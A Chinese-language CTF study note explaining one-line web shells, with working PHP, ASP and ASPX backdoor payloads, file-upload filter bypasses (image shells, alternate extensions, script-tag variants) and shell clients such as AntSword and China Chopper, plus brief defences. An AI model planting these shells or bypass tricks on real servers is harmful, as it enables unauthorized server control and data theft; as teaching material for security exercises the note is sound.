## 🎯 **一句话木马** 学习笔记

### 一、一句话木马是什么？

一句话木马是一种极简的Web后门程序，**只需一行代码**就能实现控制服务器的功能。它短小精悍，可以轻松绕过WAF（Web应用防火墙）的检测。

**举个最经典的PHP例子**：
```php
<?php @eval($_POST['cmd']); ?>
```

拆解一下这行代码：
- **`<?php ... ?>`**：PHP代码的开始和结束标记
- **`@`**：错误抑制符——就算执行出错也不报错，避免暴露自己
- **`$_POST['cmd']`**：接收通过POST方式传递的、名为`cmd`的参数——这就是连接密码
- **`eval()`**：把字符串当作PHP代码来执行

**一句话总结**：你把要执行的PHP代码通过POST请求传给这个木马文件，`eval()`直接把它跑起来——想干啥就传啥代码。


### 二、各语言常见形式

| 语言 | 一句话木马代码 |
|------|---------------|
| PHP | `<?php @eval($_POST['pass']); ?>` |
| ASP | `<%eval request("pass")%>` |
| ASPX | `<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>` |

> 💡 **新手提示**：CTF中最常见的是PHP，建议先熟练掌握PHP的一句话木马。


### 三、CTF中怎么考？——三种典型题型

#### 🟢 题型1：送分题——直接连接

题目直接告诉你一句话木马的语句，或者页面上已经写好了木马代码。

**解题步骤**：
1. 打开蚁剑（AntSword）或中国菜刀
2. 添加数据：URL填题目地址，密码填`$_POST['xxx']`里的`xxx`
3. 连接成功后，在根目录找到`flag`文件

> 💡 **新手提示**：这是最基础的题型，先练熟工具的使用！

#### 🟡 题型2：变形题——需要绕过过滤

题目对上传的文件有各种限制，需要构造特殊的一句话木马来绕过。

**常见绕过场景**：

| 限制类型 | 绕过方法 | 举例 |
|---------|---------|------|
| 只允许上传图片 | 制作**图片马**——把木马藏在图片里 | 在图片后面追加`<?php @eval($_POST['cmd']); ?>` |
| 禁止`.php`后缀 | 换其他可解析后缀 | `.phtml`、`.php3`、`.php4`、`.php5` |
| 检测文件内容 | 用`<script language="php">`替代`<?php` | `<script language="php">@eval($_POST['shell']);</script>` |
| 客户端拦截上传 | 抓包修改 | 用Burp Suite拦截请求，改后缀和MIME类型 |
| 限制字符（进阶） | **无字母数字木马**——用异或运算拼出字母 | 通过特殊符号异或构造出`phpinfo`等字符串 |

> 💡 **新手提示**：先掌握前四种基础绕过，无字母数字是进阶内容，遇到再学。

#### 🔴 题型3：混合题——结合其他漏洞

**① 日志注入**：通过User-Agent等字段把木马写入服务器日志，再通过文件包含漏洞触发执行

**② 条件竞争**：服务器上传后瞬间删除文件，需要**高并发**抢在删除前访问并生成新木马

**③ 无参数RCE**：题目只允许字母、数字、下划线、括号和分号，需要用`getcwd()`、`scandir()`、`array_reverse()`等函数链实现目录读取


### 四、解题通用流程

```
1. 信息收集 → 确定后端语言（PHP/ASP/JSP）和服务器环境
2. 构造木马 → 根据题目限制选择合适的变形方式
3. 上传/植入 → 通过各种手段把木马放到服务器上
4. 工具连接 → 用蚁剑/菜刀连接，密码是$_POST['xxx']里的xxx
5. 找flag → 在文件管理器中翻找flag文件
```


### 五、推荐工具

| 工具 | 用途 | 特点 |
|------|------|------|
| **蚁剑（AntSword）** | 连接一句话木马 | 功能强大，CTF最常用 |
| **中国菜刀（Chopper）** | 连接一句话木马 | 经典工具，操作简单 |
| **Burp Suite** | 抓包改包 | 上传绕过必备 |


### 六、如何防御（了解即可）

1. **禁用危险函数**：在`php.ini`中禁用`eval()`、`system()`、`exec()`等
2. **严格文件上传**：检查MIME类型、文件头、后缀名
3. **部署WAF**：实时检测并阻断恶意请求
4. **定期扫描**：监控网站目录中的异常短小脚本文件


### 七、总结

> **一句话木马 = 一行代码开后门 = 接收指令 → 执行指令**
>
> CTF中遇到它，三步走：**找木马 → 连工具 → 翻flag**。
>
> 遇到上传限制，记住三板斧：**改后缀、藏图片里、抓包改请求**。

先练熟送分题和基础绕过，再去挑战变形和混合题。🚀
